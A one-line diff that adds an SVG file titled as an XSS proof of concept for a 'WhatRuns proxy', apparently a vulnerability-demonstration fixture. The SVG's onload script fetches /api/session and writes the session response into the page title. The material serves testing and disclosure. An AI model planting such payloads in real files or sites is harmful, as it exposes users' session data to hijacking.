@@ -1,0 +1,1 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(&quot;/api/session&quot;).then(r=&gt;r.text()).then(t=&gt;{document.title=&quot;XSS_SESSION:&quot;+t})"><text x="10" y="30" font-size="16">WhatRuns proxy XSS PoC</text></svg>
